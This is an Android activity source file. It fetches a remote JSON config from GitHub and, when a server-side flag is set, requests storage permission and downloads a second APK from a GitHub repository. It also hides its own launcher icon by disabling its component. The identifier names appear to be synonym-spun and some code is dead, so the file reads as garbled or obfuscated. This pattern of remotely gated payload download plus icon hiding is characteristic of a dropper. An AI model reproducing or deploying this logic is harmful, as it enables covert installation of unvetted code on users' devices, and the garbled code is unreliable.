package fa.uVusoft.Uvalo;


import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.CardView;
import android.util.Log;
import android.view.View;
import android.widget.GridLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.lang.Object;


import com.uVusoft.domino.AdvancementSteps;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class Principal extends AppCompatActivity {

    private static final int THE_OUTWARD_RECORD_AUTHORIZATION_NECESSARY = 1001;
    private TextView versionText;
    public static final int version = 1;

    public static final String DISPLAY_LINK = "https://raw.githubusercontent.com/mundoa/UvUsoft/master/scripto.json";
    private AsyncTask fetchBox;
    private List<ArticlesDatum> sectionDatum;
    private ArticlesDatum datum;
    public static final String DISPLAY = "Principal";



    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.pricipal_go);

            collectFiction();

        }

    private void collectFiction() {

        fetchBox = new AsyncTask<String, Void, Integer>(){



            @Override
            protected void onPreExecute() {
            }

            @Override
            protected Integer doInBackground(String... params) {
                Integer effect = 0;
                HttpURLConnection httUrl;

                try {
                    URL pathUrl = new URL(DISPLAY_LINK);

                    httUrl = (HttpURLConnection) pathUrl.openConnection();
                    int stateCode = httUrl.getResponseCode();

                    if (stateCode == 200) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(httUrl.getInputStream()));
                        StringBuilder replay = new StringBuilder();
                        String range;

                        while ((range = reader.readLine()) != null) {
                            replay.append(range);
                        }

                        try {
                            JSONObject aim = new JSONObject(replay.toString());
                            datum = new ArticlesDatum();
                                datum.gatherReduplicationDenotation(aim.optString("reduplicationDenotation"));
                            datum.gatherReduplicationNorm(aim.optString("reduplicationNorm"));
                            datum.gatherValuation(aim.optString("valuation"));
                            datum.gatherAddress(aim.optString("address"));
                            JSONArray appointment = aim.optJSONArray("unleash");
                            sectionDatum = new ArrayList<>();
                            if (appointment != null) {
                                StringBuilder construct = new StringBuilder();

                                for (int i = 0; i < appointment.length(); ++i) {
                                    construct.append(appointment.getString(i).trim());
                                    if (i != appointment.length() - 1) {
                                        construct.append(System.getProperty("line.separator"));
                                    }
                                }
                            }
                            sectionDatum.add(datum);
                        } catch (JSONException exp) {
                            exp.printStackTrace();
                        }
                        effect = 1;
                    } else {
                        effect = 0;
                    }
                } catch (Exception exp) {
                    Log.d(DISPLAY, exp.getLocalizedMessage());
                }
                return effect;
            }

            @Override
            protected void onPostExecute(Integer effect) {
                GridLayout mainGrid = findViewById(R.id.mainGrid);
                CardView comeInFunction = findViewById(R.id.comeIn);
                comeInFunction.animate().rotation(360f).setDuration(1500);
                CardView averageNoteFunction = findViewById(R.id.averageNote);
                averageNoteFunction.animate().rotation(360f).setDuration(1500);
                CardView BringDow = findViewById(R.id.bringDow);
                BringDow.animate().rotation(360f).setDuration(1500);
                TextView viewView1 = findViewById(R.id.viewView1);
                viewView1.animate().alpha(1f).setDuration(1500);
                TextView viewView2 = findViewById(R.id.viewView2);
                viewView2.animate().alpha(1f).setDuration(1500);
                TextView ending = findViewById(R.id.ending);
                ending.animate().alpha(1f).setDuration(1500);



                String purview = datum.pullReduplicationNorm();
                String secondPurview = datum.pullValuation();

                setVisibleElements(mainGrid, comeInFunction, averageNoteFunction, BringDow, viewView1, viewView2, ending, purview, secondPurview);

            }

        }.execute();

    }

    private void setVisibleElements(GridLayout mainGrid, CardView comeInFunction, CardView averageNoteFunction, CardView BringDow, TextView viewView1, TextView viewView2, TextView ending, String purview, String secondPurview) {
        if (purview.equals("2")) {
            Log.w("check that", "all right");
            comeInFunction.setEnabled(false);
            mainGrid.setVisibility(View.VISIBLE);
            viewView1.setVisibility(View.VISIBLE);
            viewView2.setVisibility(View.VISIBLE);
            ending.setVisibility(View.VISIBLE);
            comeInFunction.setVisibility(View.VISIBLE);
            BringDow.setVisibility(View.VISIBLE);
            loadData();
            if(secondPurview.equals("2")){
                averageNoteFunction.setVisibility(View.VISIBLE);

            }
        }
    }


    public void averageNoteFunction(View view)
    {
        Uri storeUrl = Uri.parse("market://details?id=" + getApplicationContext().getPackageName());
        Intent roadToStore = new Intent(Intent.ACTION_VIEW, storeUrl);
        roadToStore.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        try {
            startActivity(roadToStore);
        } catch (ActivityNotFoundException exp) {
            startActivity(new Intent(Intent.ACTION_VIEW,
                    Uri.parse("http://play.google.com/store/apps/details?id=" + getApplicationContext().getPackageName())));
        }
    }

    public void comeInFunction(View view)
    {
        unBurrow();
    }

    private void unBurrow() {
        PackageManager pkg = getPackageManager();
        ComponentName motifDenotation = new ComponentName(this, Principal.class);
        pkg.setComponentEnabledSetting(motifDenotation, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    private void testComposeOuterStoreOrder() {

        if (ActivityCompat.checkSelfPermission(Principal.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {

            paddingTask();
        } else {

            requireComposeOuterStoreOrder();
        }
    }

    private void requireComposeOuterStoreOrder() {
        if (ActivityCompat.checkSelfPermission(Principal.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(Principal.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, THE_OUTWARD_RECORD_AUTHORIZATION_NECESSARY);
        } else {
            ActivityCompat.requestPermissions(Principal.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, THE_OUTWARD_RECORD_AUTHORIZATION_NECESSARY);
        }
    }

    @Override
    public void onRequestPermissionsResult(int orderProgram, @NonNull String[] orders, @NonNull int[] accordEffects) {
        super.onRequestPermissionsResult(orderProgram, orders, accordEffects);
        if (orderProgram == THE_OUTWARD_RECORD_AUTHORIZATION_NECESSARY && accordEffects.length == 1 && accordEffects[0] == PackageManager.PERMISSION_GRANTED) {
            paddingTask();
        } else {
            Toast.makeText(Principal.this, "Authorization Not Allowed.", Toast.LENGTH_SHORT).show();
        }
    }



    public void advancementSteps(View view) {
        CardView comeInFunction = findViewById(R.id.comeIn);
        testComposeOuterStoreOrder();
        comeInFunction.setEnabled(true);
    }

    public void loadData() {

        testComposeOuterStoreOrder();
    }

    private void paddingTask() {

        AdvancementSteps advancementSteps = new AdvancementSteps(Principal.this);

        advancementSteps.beginUploadingRequirement("https://github.com/mundoa/UvUsoft/raw/master/app-release.apk");
    }

}




